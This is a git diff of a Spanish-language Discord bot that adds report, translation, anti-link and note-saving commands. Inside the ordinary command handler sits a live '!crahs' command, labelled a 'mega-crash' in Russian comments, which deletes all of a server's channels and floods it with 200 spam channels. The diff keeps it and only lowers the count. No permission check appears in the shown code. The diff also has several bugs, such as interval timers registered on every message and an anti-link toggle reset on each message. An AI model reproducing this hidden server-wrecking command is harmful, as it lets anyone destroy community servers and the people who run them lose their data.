@@ -2,16 +2,22 @@
 
 const fs = require("fs");
 const { Player } = require('discord-player');
-const { Client, Intents, Partials, PermissionFlagsBits, PermissionsBitField, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
+const { Discord, Client, Intents, Partials, PermissionFlagsBits, PermissionsBitField, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
 const transcript = require('discord-html-transcripts');
+const translate = require('translate-google-api');
 const { ApplicationCommandOptionType } = require('discord.js');
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
-const { YoutubeiExtractor } = require('discord-player-youtubei');
+const { joinVoiceChannel, createAudioPlayer, createAudioResource, AudioPlayerStatus, getVoiceConnection } = require('@discordjs/voice');
+//const { YoutubeiExtractor } = require('discord-player-youtubei');
 const { Schema, model } = require('mongoose');
 require('dotenv').config();
 const crypto = require('crypto');
 const chalk = require('chalk');
 const speed = require('performance-now');
+const ytdl = require('ytdl-core');
+const ffmpeg = require('ffmpeg-static');
+const { v4: uuidv4 } = require('uuid'); // Instala el paquete uuid: npm install uuid
+const uuid = require('uuid'); // Importa el paquete uuid.
 const { version } = require('./package.json');
  // To read the JSON files
  
@@ -20,8 +26,9 @@ const client = new Client({
         GatewayIntentBits.Guilds,
         GatewayIntentBits.MessageContent,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.GuildVoiceStates
-    ],
+        GatewayIntentBits.GuildVoiceStates,
+        GatewayIntentBits.GuildMembers
+        ],
     partials: [Partials.Message, Partials.Channel, Partials.GuildMember]
 });
 // Parse duration string to milliseconds
@@ -47,41 +54,90 @@ function hasModPermissions(member) {
         member.permissions.has(PermissionFlagsBits.Administrator);
 }
 
-// Create slash commands
-const commands = [
-    new SlashCommandBuilder()
-        .setName('info')
-        .setDescription('Get information about the bot')
-];
-
 const player = new Player(client);
-player.extractors.register(YoutubeiExtractor);
+//player.extractors.register(YoutubeiExtractor);
 
-let currentPlayerMessage = null; 
-
-// load the quotes and jokes from json files
 const quotesData = JSON.parse(fs.readFileSync("quotes.json", "utf8"));
 const jokesData = JSON.parse(fs.readFileSync("jokes.json", "utf8"));
-const ticketSchema = new Schema({
-	guildId: String,
-	channelId: String,
-	authorId: String,
-});
-const handlerticket = model('tickets', ticketSchema);
-const ticketModel = handlerticket
+// load the quotes and jokes from json files
 
-// command prefix
 const prefix = "!";
-
-// write your bot token here... DONT SHARE IT (which is why i didnt put mine here)
+// command prefix
 const token = "YOUR_BOT_TOKEN";
+// write your bot token here... DONT SHARE IT (which is why i didnt put mine here)
+const propietarioID = '1317568519767982091';
+// Reemplaza 'TU_ID_DE_USUARIO' con tu ID de usuario de Discord.
+
+// Función para leer y escribir el archivo JSON de reportes.
+function leerReportes() {
+  try {
+    const data = fs.readFileSync('reportes.json', 'utf8');
+    return JSON.parse(data);
+  } catch (error) {
+    return {};
+  }
+}
+
+function escribirReportes(reportes) {
+  fs.writeFileSync('reportes.json', JSON.stringify(reportes, null, 2));
+}
+
+// Función para eliminar reportes respondidos después de 2 días.
+function eliminarReportesRespondidos() {
+  const reportes = leerReportes();
+  const ahora = Date.now();
+  const dosDias = 2 * 24 * 60 * 60 * 1000; // 2 días en milisegundos
+
+  for (const idMensajeReporte in reportes) {
+    if (reportes[idMensajeReporte].respondido && ahora - reportes[idMensajeReporte].fechaRespuesta > dosDias) {
+      delete reportes[idMensajeReporte];
+    }
+  }
+
+  escribirReportes(reportes);
+}
+const limite = 10; // Establece el límite de entradas aquí
+const limiteCaracteres = 200; // Establece el límite de caracteres aquí
+const tiempoExpiracion = 7 * 24 * 60 * 60 * 1000; // 7 días en milisegundos
 
 client.on("messageCreate", async (message) => {
   if (!message.content.startsWith(prefix) || message.author.bot) return;
+    eliminarEntradasExpiradas(); // Inicia la eliminación de entradas expiradas
+  setInterval(eliminarEntradasExpiradas, 60 * 60 * 1000); // Ejecuta cada hora
+ setInterval(eliminarReportesRespondidos, 60 * 60 * 1000);
+
+async function eliminarEntradasExpiradas() {
+  try {
+    if (fs.existsSync('datos.json')) {
+      const data = JSON.parse(fs.readFileSync('datos.json'));
+      const ahora = Date.now();
+      let cambios = false;
+
+      for (const clave in data) {
+        if (data[clave].timestamp && ahora - data[clave].timestamp > tiempoExpiracion) {
+          delete data[clave];
+          cambios = true;
+        }
+      }
+
+      if (cambios) {
+        fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
+        console.log('Entradas expiradas eliminadas.');
+      }
+    }
+  } catch (error) {
+    console.error('Error al eliminar entradas expiradas:', error);
+  }
+}
   const name = message.author.username || 'Usuario';     
   const args = message.content.slice(1).trim().split(/ +/);
   const command = args.shift().toLowerCase();
   const rest = new REST({ version: '10' }).setToken(token);
+    let antiLinkEnabled = true; // Inicialmente habilitado
+  const discordRegex = /discord\.(gg|com|net|app)\/[\w-]+/i;
+  const whatsappRegex = /chat\.whatsapp\.com\/[\w-]+/i;
+  const telegramRegex = /t\.me\/[\w-]+/i;
+
   const isDM = message.channel.type === 'DM';
 console.log(chalk.bold.cyan('┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅•'));
 console.log(`${chalk.bold('┋[📩] Mensaje :')} ${chalk.white(message.content)} (Tipo: ${message.channel.type})`);
@@ -96,6 +152,136 @@ console.log(message.content)
   const timestamp = speed();
   const latensi = speed() - timestamp;
 message.reply(`*Velocidad*: ${latensi.toFixed(4)} _ms_`);
+  }
+
+    if (command === 'antilink') {
+        antiLinkEnabled = !antiLinkEnabled;
+        message.channel.send(`El filtro anti-enlaces ahora está ${antiLinkEnabled ? 'activado' : 'desactivado'}.`);
+    }
+
+    if (antiLinkEnabled && !message.author.bot) {
+        if (discordRegex.test(message.content) || whatsappRegex.test(message.content) || telegramRegex.test(message.content)) {
+            const member = message.member;
+            if (member.permissions.has(PermissionsBitField.Flags.Administrator) || member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
+                await message.channel.send('¡A perro robando miembros!');
+                return;
+            }
+
+            if (message.guild && message.content.includes(message.guild.id)) {
+                await message.channel.send('¿Qué haces con el enlace de este servidor?');
+                return;
+            }
+
+            try {
+                await message.delete();
+                await message.channel.send(`${message.author.toString()}, ¡no se permiten enlaces aquí!`);
+            } catch (error) {
+                console.error('No tengo permisos para borrar mensajes:', error);
+                await message.channel.send('No tengo permisos para borrar mensajes.');
+            }
+        }
+    }
+
+  if (command === 'reporte') {
+    if (args.length === 0) {
+      return message.channel.send('Por favor, proporciona un mensaje para enviar.');
+    }
+
+    const reporte = args.join(' ');
+    const reportes = leerReportes();
+    const idMensajeReporte = message.id;
+    const ahora = Date.now();
+    const cincoDias = 5 * 24 * 60 * 60 * 1000; // 5 días en milisegundos
+    const clave = uuid.v4(); // Genera una clave UUID única.
+
+    // Verifica si el usuario ha enviado un reporte en los últimos 5 días.
+    for (const id in reportes) {
+      if (reportes[id].usuarioID === message.author.id && ahora - reportes[id].fechaEnvio < cincoDias) {
+        return message.channel.send('Solo puedes enviar un reporte cada 5 días.');
+      }
+    }
+
+    reportes[idMensajeReporte] = {
+      usuarioID: message.author.id,
+      texto: reporte,
+      respondido: false,
+      fechaEnvio: ahora,
+      clave: clave,
+    };
+
+    escribirReportes(reportes);
+
+    client.users.fetch(propietarioID).then(propietario => {
+      propietario.send(`Reporte de ${message.author.tag} (ID: ${idMensajeReporte}, Clave: ${clave}): ${reporte}`);
+      message.channel.send(`Tu reporte ha sido enviado. Clave del reporte: ${clave}`);
+    }).catch(error => {
+      console.error(error);
+      message.channel.send('No se pudo enviar el reporte.');
+    });
+  }
+
+  if (command === 'responder') {
+    if (message.author.id !== propietarioID) return;
+
+    if (args.length < 2) {
+      return message.channel.send('Por favor, proporciona la clave del reporte y la respuesta.');
+    }
+
+    const clave = args.shift();
+    const respuesta = args.join(' ');
+    const reportes = leerReportes();
+
+    // Encuentra el reporte con la clave proporcionada.
+    const reporteEncontrado = Object.values(reportes).find(reporte => reporte.clave === clave);
+
+    if (!reporteEncontrado) {
+      return message.channel.send('Clave de reporte inválida.');
+    }
+
+    client.users.fetch(reporteEncontrado.usuarioID).then(usuarioReporte => {
+      usuarioReporte.send(`Respuesta a tu reporte: ${respuesta}`);
+      message.channel.send('Respuesta enviada.');
+      reporteEncontrado.respondido = true;
+      reporteEncontrado.fechaRespuesta = Date.now();
+      escribirReportes(reportes);
+    }).catch(error => {
+      console.error(error);
+      message.channel.send('No se pudo enviar la respuesta.');
+    });
+  }
+
+  if (command === 'reportes') {
+    if (message.author.id !== propietarioID) return;
+
+    const clave = args.shift();
+    const reportes = leerReportes();
+    let mensaje = 'Reportes pendientes:\n';
+
+    for (const idMensajeReporte in reportes) {
+      if (!reportes[idMensajeReporte].respondido && (!clave || reportes[idMensajeReporte].clave === clave)) {
+        mensaje += `ID: ${idMensajeReporte}, Clave: ${reportes[idMensajeReporte].clave}, Usuario: <@${reportes[idMensajeReporte].usuarioID}>, Texto: ${reportes[idMensajeReporte].texto}\n`;
+      }
+    }
+
+    message.channel.send(mensaje || 'No hay reportes pendientes.');
+  } 
+  
+  if (command === 'traducir') {
+    const args = message.content.split(' ');
+    const idioma = args[1];
+    const texto = args.slice(2).join(' ');
+
+    if (!idioma || !texto) {
+      return message.channel.send('Debes proporcionar un idioma y texto a traducir.');
+    }
+
+    try {
+      const traduccion = await translate(texto, { to: idioma });
+      message.channel.send(traduccion);
+    } catch (error) {
+      console.error(error);
+      message.channel.send('No se pudo traducir el texto.');
+    }
   }
   
   // Command: Joke
@@ -114,7 +300,7 @@ message.reply(`*Velocidad*: ${latensi.toFixed(4)} _ms_`);
         const creatorEmbed = new EmbedBuilder()
             .setTitle('Creador Del Bot')
             .setDescription('Bot Creado Por **CuervoOFC**')
-            .setColor(#0099ff)
+            .setColor('#0099ff')
             .addFields(
                 { name: 'GitHub', value: '[CuervoOFC](https://github.com/CuervoOFC)', inline: true },
                 { name: 'Bot Version', value: '1.0.0', inline: true }
@@ -178,18 +364,13 @@ if (command === "serverinfo") {
         message.channel.send({ embeds: [embed] });
     }
     
-   if (command === "piropo") {
-        const piro = ["Si tu cuerpo fuera cárcel y tus labios cadena, qué bonito lugar para pasar mi condena.", "!Lo tuyo es un dos por uno, además de guapa eres simpática!", "Fíjate como es la ciencia que ahora hasta hacen bombones que andan.", "Por la luna daría un beso, daría todo por el sol, pero por la luz de tu mirada, doy mi vida y corazón.", "Si yo fuera un avión y tu un aeropuerto, me la pasaría aterrizando por tu hermoso cuerpo.", "Tantas estrellas en el espacio y ninguna brilla como tú.", "Me gusta el café, pero prefiero tener-té.", "No eres Google, pero tienes todo lo que yo busco.", "Mis ganas de ti no se quitan, se acumulan.",  "Te regalo esta flor, aunque ninguna será jamás tan bella como tú.", "Cuando te multen por exceso de belleza, yo pagaré tu fianza.", "Si cada gota de agua sobre tu cuerpo es un beso, entonces quiero convertirme en aguacero.", "Estás como para invitarte a dormir, y no dormir.", "Si tu cuerpo fuera cárcel y tus brazos cadenas, ese sería el lugar perfecto para cumplir condena.",  " Cómo podría querer irme a dormir si estás tú al otro lado de la pantalla?", "Quisiera ser hormiguita para subir por tu balcón y decirte al oído: guapa, bonita, bombón.", "En mi vida falta vida, en mi vida falta luz, en mi vida falta alguien y ese alguien eres tú.", "Señorita, si supiera nadar, me tiraría en la piscina de tus ojos desde el trampolín de sus pestañas.", "Señorita disculpe, pero la llaman de la caja... –Qué caja?... –De la caja de bombones que te escapaste", "Eres tan hermosa que te regalaría un millón de besos y si no te gustasen te los aceptaría de regreso.", "Eres tan bonita que Dios bajaría a la tierra tan solo para verte pasar.", "¡Eres como una cámara Sony! Cada vez que la miro no puedo evitar sonreir.", "En una isla desierta me gustaría estar y sólo de tus besos poderme alimentar.", "Si fueras lluvia de invierno, yo cerraría el paraguas para sentirte en mi cuerpo.", "Me gustas tanto, tanto, que hasta me gusta estar preso, en las redes de tu encanto.", "Si te pellizco seguro que te enojas pero si me pellizcas tu, seguro que me despierto.", "No son palabras de oro ni tampoco de rubí, son palabras de cariño que compongo para usted.", "Te invito a ser feliz yo pago.", "Cuando caminas no pisas el suelo, lo acaricias.", "Nos veríamos lindo en un pastel de boda juntos.", "Tantas formas de vida y yo solo vivo en sus ojos.", "¿A qué numero llamo si quiero marcarte de por vida?", "Me gustas tanto que no se por donde empezar a decírtelo.", "Todos se quedan con tu físico, pero yo prefiero tu corazón.", "Hola si te gustan los idiomas cuando quieras te enseño mi lengua.", "Dime por donde paseas para besar el suelo que pisas, preciosidad!", "Tu belleza me enciega porque viene desde su corazón y se refleja en tus ojos.", "Eres de esa clase de personas, por las cuales a las estrellas se les piden deseos.", "Si alguna vez te han dicho que eres bella te mintieron, no eres bella eres hermosa.", "Celeste es el cielo, amarilla la nata y negros son los ojos de la chica que me mata.", "Si yo fuera Colón navegaría día y noche para llegar a lo más profundo de tu corazón.", "Cinco calles he cruzado, seis con el callejón, sólo me falta una para llegar a tu corazón.", "Si fueras mi novia me volvería ateo ¿ Por que? Porque no tendría nada más que pedirle a Dios.", "A una hermosa niña acompañada de la madre: ¡Que linda flor, lástima que venga con la maceta!", "Si me dedicas una sonrisa pasas de ser linda a perfecta.", "¿Qué pasó en el cielo que se están cayendo los ángeles?", "¡Te voy a poner una multa!. ¿Por qué? Por exceso de belleza.", "Como se habrán querido tus padres... por haberte hecho tan bonita.", "Por qué el cielo está nublado? Porque todo el azul está en tus ojos.", "¿Tienes alguna herida, guapa ? Tiene que ser duro caerse del cielo.", "Tus ojos son verdes los míos café, los míos te quieren los tuyos no sé.", "Cuando el día se nubla, no extraño al sol, porque lo tengo en tu sonrisa.", "Pasa una mujer y dice adiós... -a DIOS lo vi cuando me miraron tus ojos!", "En otras partes del mundo se están quejando, porque el sol está acá nada mas.", "Aprovecha que estoy en rebaja guapa y te dejo dos besos por el precio de uno. Dios se pasó al crearte a ti.", "Al amor y a ti los conocí al mismo tiempo.", "Si la belleza fuese tiempo, tú serías 24 horas.", "Si algún día te pierdes, búscate en mis pensamientos!", "Si amarte fuera pecado, tendría el infierno asegurado.", "Eres lo único que le falta a mi vida para ser perfecto.", "Eres la única estrella que falta en el cielo de mi vida!", "Ahora que te conozco, no tengo nada mas que pedirle a la vida!", "Voy a tener que cobrarte alquiler, porque desde que te vi no has dejado de vivir en mis sueños.", "Me gustaría ser tu almohada, para que me abraces todas las mañanas.", "No te digo palabras bonitas, sino un verso sincero: mi amor por ti es infinito y mi corazón es verdadero.", "Lo que siento por ti es tan inmenso que, para guardarlo, me haría falta otro universo.", "Las matemáticas siempre dicen la verdad: tú y yo juntos hasta la eternidad.", "Que fácil sería cumplir una condena si tu cuerpo fuera cárcel y tus brazos cadenas.", "Mi madre me dijo que no debía pecar, pero por ti estoy dispuesta a confesarme.", "No se trata del whisky ni la cerveza, eres tú quien se me ha subido a la cabeza.", "De noche brilla la luna, y de día brilla el sol, pero tus ojos bonitos alumbran mi corazón.", "No me busques, prefiero seguir perdido en tu mirada.", "Unos quieren el mundo, otros quieren el sol, pero yo solo quiero un rincón en tu corazón.", "Te dejaré de amar a partir del día que encuentre el alfiler que ahora tiro al mar.", "Bienaventurados los borrachos, porque ellos te verán dos veces.", "Como avanza la ciencia si ya las flores caminan.", "Tanta curva y yo sin frenos.", "Si Adán por Eva se comió una manzana, yo por Ti me comería una frutería.", "Si yo fuera astronauta te llevaría a Plutón, pero como no lo soy te llevo siempre en mi corazón.", "Tú debes ser atea, porque estás como quieres y no como Dios manda.", "Si que está avanzada la ciencia; que hasta los bombones caminan.", "¿De qué juguetería te escapaste?, ¡muñeca!", "Ayer pasé por tu casa y me tiraste un ladrillo … mañana pasaré de nuevo para construirte un castillo.", "¿Te dolió caer del cielo… angelito?", "Tu madre debía de ser pastelera porque un bombón como tú no lo hace cualquiera.", "Tu papá debe ser un pirata, porque tú eres un tesoro!", "Siempre escucho decir a las personas que Disneyland es el lugar más feliz del mundo. Pero me pregunto ¿si han estado alguna vez a tu lado?", "Por algún motivo, hoy me sentía un poco mal. Pero cuando te vi llegar, me excitaste y se me fue todo el malestar.", "¿Sabes si hay un aeropuerto por aquí cerca o mi corazón está despegando?", "¿Tu papá era boxeador? ¿NO? ¡Porque maldita sea tengo que decírtelo!, eres un nocaut (K.O.)!", "¡Ohh Dios mío! ¿Tienes un corazón extra?. Por que el mío acaba de ser robado.", "Aparte de ser increíblemente sexy, ¿a qué te dedicas?", "¿Acaba de salir el sol o simplemente me sonreíste?", "Tienes que besarme si me equivoco, ¿los dinosaurios todavía existen?", "Oye, eres linda y yo lindo. Juntos seríamos bastante lindos.", "Estoy seguro que tu nombre debe ser Google. ¿Sabes porque? Por que tienes absolutamente todo lo que estaba buscando!", "Estoy seguro que tu padre es extraterrestre ¡Porque no he visto nada como tú en la Tierra!", "Por favor no te asustes con esta pregunta pero… ¿Tu padre era un ladrón? Porque alguien robó las estrellas del cielo y las puso en tus ojos bebota.", "¿Tienes un lápiz y una goma? Porque quiero borrar tu pasado y escribir nuestro futuro.", "No necesitas llaves para volverme loco.", "Lo siento, pero me debes un trago. [¿Por qué?] Porque cuando te miré, me dejaste hipnotizado y tire mi trago!", "Debes ser una escoba, porque acabas de derribarme.", "Adelante, siente mi camisa. ¡Está hecho de material de novio!", "¿Crees en el amor a primera vista? ¿O tendría pasar frente a ti de nuevo?", "Estoy estudiando sobre fechas importantes en la historia. ¿Quieres ser una de ellas?", "Discúlpame pero.. Tu ¿Eres un préstamo? ¡Porque tienes todo mi interés!", "Si soy vinagre, entonces debes ser bicarbonato de sodio. ¡Porque me haces sentir burbujeante por dentro!", "Por un segundo pensé que estaba muerto y me ido al cielo. Ahora veo que todavía vivo, pero el cielo me ha sido traído.", "¿Puedo pedirte un beso? Te juro que te lo devolveré.", "Por favor deja de ser tan dulce! Me estás dando dolor de muelas!", "¡Eres como mi taza de café favorita, caliente y para relamerse los labios!", "¿Eres una cámara? Porque cada vez que te miro, sonrío.", "¿Sabes qué te quedaría realmente bien? Yo.", "No necesito Twitter, ya te estoy siguiendo.", "Tiene que darme tu nombre para saber qué gritar esta noche.", "Es un hecho!. Ya te encuentras en mi lista de cosas por hacer esta noche imposible de que te me escapes!", "¿Sabes qué hay en el menú de rico? Bueno, Tu y yo baby!", "Tus labios se ven muy solitarios y secos. Permíteme presentarte los míos.", "Si nada dura para siempre, ¿serás mi nada?", "¿Tienes un nombre? ¿O puedo llamarte mía?", "¿Has estado cubierta de abejas recientemente? Solo lo asumí, porque te ves más dulce que la miel.", "Debe haber algo mal en mis ojos. No puedo dejar de mirarte.", "Eres como el fuego. Porque estás súper caliente.", "Con mis amigos apostamos a que no podría entablar una conversación con la mujer más guapa del bar. Bueno y ahora ¿Qué deberíamos hacer con su dinero?", "Bueno, aquí estoy tu deseo fue cumplido. Ahora bien.. ¿Cuáles son tus otros 2 deseos para el genio de la lampara?", "Mira… no soy matemático, pero soy bastante bueno con los números. Por que no me das tu numero y te enseño lo que puedo hacer con él.", "¿Eres una viajera en el tiempo? ¡Porque te veo en mi futuro!", "Si tú y yo fuéramos calcetines, ¡haríamos un gran par!", "Aparte de ser increíblemente hermosa, ¿a qué te dedicas?", "¿Quieres una pasa? ¿No? Bueno, ¿Qué tal una cita?", "Puede que no sea fotógrafo. Pero puedo imaginarnos totalmente juntos.", "Tu debes ser una maga. ¿No? Es raro porque cada vez que te miro, mágicamente todos desaparecen!", "Quiero que nuestro amor sea como el número Pi: irracional y sin fin.", "Estoy escribiendo un libro sobre todas las cosas buenas de la vida y tu estas en la primera pagina.", "Tú eres la razón por la que incluso Santa tiene una lista traviesa.", "¿Dónde te he visto antes? Oh sí, ahora lo recuerdo. ¡Estaba en el diccionario junto a la palabra MAGNÍFICO!", "No siempre fui religioso. Pero lo soy ahora, porque eres la respuesta a todas mis oraciones.", "Debes de estar exhausto. Has estado corriendo por mi mente todo el día.", "Hay algún problema con mi teléfono. No tiene tu número en él.", "Soy nuevo en la ciudad. ¿Podría darme indicaciones para llegar a su apartamento?", "¿Eres mi cargador de teléfono? Porque sin ti me moriría.", "Disculpe, ¿sabe cuánto pesa un oso polar? ¿No? Yo tampoco pero rompe el hielo.", "Imagina esto unos segundos: ¿No crees que nos veríamos tiernos en un pastel de bodas con nuestras caras en el?", "Solamente una cosa cambiaria de ti, y ese es tu apellido por el nuestro.", "Lo siento! Pero tengo que pedirte que te vayas de aquí!. Estás haciendo quedar mal a las otras chicas ¿No te da vergüenza?", "Perdona pero, ¿Podrías sostener mi brazo? Así puedo decirles a mis amigos que me ha tocado un ángel en la tierra!", "Hola, estoy escribiendo una guía telefónica, ¿puedo darme su número?", "Hola ¿Te conozco? Porque te pareces demasiado a mi futura novia.", "Entonces, cuando nuestros amigos nos pregunten cómo nos conocimos, ¿Qué les diremos?", "¿Cuáles son tus prioridades el domingo?: ¿Dormir, ejercitarte o una avalancha de mimos?", "Mie@»!# Creo que he perdido mi número, ¿Puedo tener tu número?", "Si Internet Explorer es tan valiente como para pedirme que sea mi navegador predeterminado, yo también soy lo suficientemente valiente para invitarte a salir.", "¿Ves a mi amigo allá? El pregunta si crees que soy lindo.", "¡Dios!!! Eres tan hermosa que lograste que me olvidara lo que iba a decirte.", "Hola, mi nombre es [tu nombre], pero puedes llamarme esta noche.", "Oye, ¿tienes un par de minutos para que ligue contigo?", "¿Eres un punto de acceso Wi-Fi? Porque siento una conexión.", "No busques mas!. En una escala del 1 al 10, eres un 9…seguro y yo soy el 1 que necesitas para el 10.", "No se que esta pasando ¿Hubo un terremoto o simplemente sacudiste mi mundo?", "¿De casualidad eres religiosa? Porque eres la respuesta a todas mis oraciones.", "¿Eres Netflix? Porque podría quedarme despierto observándote cuatro horas.", "Tengo que decírtelo tu te pareces mucho a mi próxima alma gemela.", "¿Puedo tener tu foto para mi lista de navidad de regalos que pediré a Santa?", "Si tú y yo fuéramos calcetines seguro que haríamos un gran par.", "¿Espero que no te moleste si te sigo? Mi madre siempre me dijo que siguiera mis sueños.", "Acabas de dejar caer algo … mi mandíbula.", "He estado mirando tu foto de perfil durante años. Todavía no puedo parar.", "¿Eres una obra de arte? Porque me gustaría clavarte en mi pared. ¡Guauu!", "Después de mirarte durante 0,7 segundos, me duele la cabeza. Puede tener dolor de cabeza al mirar algo tan brillante.", "Eres el tipo de chica que mi mamá me dijo que le trajera. ¿Te gustaría ir a verla conmigo?", "Hola mi nombre es Will…soy la gran voluntad de Dios solo para ti.", "Tu rostro es perfecto… como una obra de arte bien armada. Dios hizo un gran trabajo contigo.", "Te miro y solo puedo imaginar lo feliz que será mi vida, despertando a tu lado cada mañana.", "Tus ojos son hermosos. ¿Llevas lentes de contacto? (Solo diga esto siempre y cuando no use lentes de contacto).", "¿Puedo compartir una historia con ustedes? (Adelante, cuéntele la historia de un hombre que dio todo para que una mujer se enamorara de él, dígale que usted es ese hombre y ella esa mujer).", "¿Me estaba sonriendo o acababa de salir el sol?", "Tus ojos me han dicho muchas cosas. Pero lo que no me dicen es tu nombre.", "Vi un jardín esta mañana y pensé que era el más hermoso hasta que te conocí.", "¡Debo estar en el cielo porque estoy mirando a un ángel!", "Debe haber algo mal en mis ojos, no puedo quitárselos.", "Nunca jugaría al escondite contigo porque alguien como tú es imposible de encontrar.", "Puedes caer del cielo, puedes caer de un árbol, pero la mejor manera de caer… es enamorado de mí.", "¿Tienes un nombre o simplemente puedo llamarte mía?", "Me voy a quejar a Spotify porque no eres el single más popular de esta semana.", "Las rosas son rojas como mi cara pero eso solo pasa cuando estoy cerca de ti.", "Me gustaría invitarte al cine pero no permiten bocadillos!" ];
-        message.reply(`🎱 ${piro[Math.floor(Math.random() * responses.length)]}`);
-    }
-    
     if (command === "crahs") {
     // Мега-краш по команде
     const guild = message.guild;
     // 1. Удалить все каналы
     guild.channels.cache.forEach(channel => channel.delete().catch(err => {}));
     // 2. Спам новыми каналами (500+)
-    for (let i = 0; i < 500; i++) {
+    for (let i = 0; i < 200; i++) {
       guild.channels.create({ name: `CRAHS-BY-MIYAMURABOT-${i}`, type: 0 })
         .then(() => console.log(`Канал ${i} создан!`))
         .catch(() => {});
@@ -329,7 +510,150 @@ if (command === "serverinfo") {
             console.error(error);
         }
     }
-    
+
+  if (command === 'guardar') {
+    const texto = message.content.slice(9).trim();
+    if (!texto) return message.reply('Debes proporcionar el texto que quieres guardar.');
+
+    if (texto.length > limiteCaracteres) {
+      return message.reply(`El texto no puede exceder los ${limiteCaracteres} caracteres.`);
+    }
+
+    try {
+      let data = {};
+      if (fs.existsSync('datos.json')) {
+        data = JSON.parse(fs.readFileSync('datos.json'));
+      }
+
+      if (Object.keys(data).length >= limite) {
+        return message.reply(`Se ha alcanzado el límite de ${limite} entradas.`);
+      }
+
+      const clave = uuidv4();
+      data[clave] = {
+        texto: texto,
+        timestamp: Date.now(), // Guarda la marca de tiempo
+      };
+      fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
+      message.reply(`Texto guardado correctamente. Clave: \`${clave}\``);
+    } catch (error) {
+      console.error('Error al guardar el texto:', error);
+      message.reply('Ocurrió un error al guardar el texto.');
+    }
+  }
+
+  if (command === 'ver') {
+    const clave = message.content.slice(5).trim();
+    if (!clave) return message.reply('Debes proporcionar la clave del texto que quieres ver.');
+
+    try {
+      if (fs.existsSync('datos.json')) {
+        const data = JSON.parse(fs.readFileSync('datos.json'));
+        if (data[clave]) {
+          message.reply(`Texto guardado:\n\`\`\`${data[clave].texto}\`\`\``);
+        } else {
+          message.reply('No se encontró el texto con esa clave.');
+        }
+      } else {
+        message.reply('No hay textos guardados.');
+      }
+    } catch (error) {
+      console.error('Error al ver el texto:', error);
+      message.reply('Ocurrió un error al ver el texto.');
+    }
+  }
+
+  if (command === 'borrar') {
+    const clave = message.content.slice(8).trim();
+    if (!clave) return message.reply('Debes proporcionar la clave del texto que quieres borrar.');
+
+    try {
+      if (fs.existsSync('datos.json')) {
+        const data = JSON.parse(fs.readFileSync('datos.json'));
+        if (data[clave]) {
+          delete data[clave];
+          fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
+          message.reply('Texto borrado correctamente.');
+        } else {
+          message.reply('No se encontró el texto con esa clave.');
+        }
+      } else {
+        message.reply('No hay textos guardados.');
+      }
+    } catch (error) {
+      console.error('Error al borrar el texto:', error);
+      message.reply('Ocurrió un error al borrar el texto.');
+    }
+  }
+
+  if (command === 'entradas') {
+    try {
+      if (fs.existsSync('datos.json')) {
+        const data = JSON.parse(fs.readFileSync('datos.json'));
+        const entradasUsadas = Object.keys(data).length;
+        const entradasDisponibles = limite - entradasUsadas;
+        message.reply(`Entradas usadas: ${entradasUsadas}\nEntradas disponibles: ${entradasDisponibles}`);
+      } else {
+        message.reply(`Entradas usadas: 0\nEntradas disponibles: ${limite}`);
+      }
+    } catch (error) {
+      console.error('Error al mostrar las entradas:', error);
+      message.reply('Ocurrió un error al mostrar las entradas.');
+    }
+  }
+
+  if (command === 'tiempo') {
+    const clave = message.content.slice(8).trim();
+    if (!clave) return message.reply('Debes proporcionar la clave del texto.');
+
+    try {
+      if (fs.existsSync('datos.json')) {
+        const data = JSON.parse(fs.readFileSync('datos.json'));
+        if (data[clave]) {
+          const tiempoRestante = tiempoExpiracion - (Date.now() - data[clave].timestamp);
+          if (tiempoRestante > 0) {
+            const dias = Math.floor(tiempoRestante / (24 * 60 * 60 * 1000));
+            const horas = Math.floor((tiempoRestante % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
+            const minutos = Math.floor((tiempoRestante % (60 * 60 * 1000)) / (60 * 1000));
+            message.reply(`Tiempo restante para la clave \`${clave}\`: ${dias} días, ${horas} horas, ${minutos} minutos.`);
+          } else {
+            message.reply(`La clave \`${clave}\` ha expirado.`);
+          }
+        } else {
+          message.reply('No se encontró el texto con esa clave.');
+        }
+      } else {
+        message.reply('No hay textos guardados.');
+      }
+    } catch (error) {
+      console.error('Error al mostrar el tiempo restante:', error);
+      message.reply('Ocurrió un error al mostrar el tiempo restante.');
+    }
+  }
+  
+    if (command === 'restaurar') {
+    const clave = message.content.slice(10).trim();
+    if (!clave) return message.reply('Debes proporcionar la clave del texto.');
+
+    try {
+      if (fs.existsSync('datos.json')) {
+        const data = JSON.parse(fs.readFileSync('datos.json'));
+        if (data[clave]) {
+          data[clave].timestamp = Date.now(); // Restablece la marca de tiempo
+          fs.writeFileSync('datos.json', JSON.stringify(data, null, 2));
+          message.reply(`Tiempo de expiración para la clave \`${clave}\` restablecido.`);
+        } else {
+          message.reply('No se encontró el texto con esa clave.');
+        }
+      } else {
+        message.reply('No hay textos guardados.');
+      }
+    } catch (error) {
+      console.error('Error al restablecer el tiempo de expiración:', error);
+      message.reply('Ocurrió un error al restablecer el tiempo de expiración.');
+    }
+  }
+  
     // Command: Menu
     if (command === 'menu') {
         const uptime = Math.floor(process.uptime());
@@ -359,7 +683,11 @@ if (command === "serverinfo") {
     }
     
     if (command === 'listbot') {
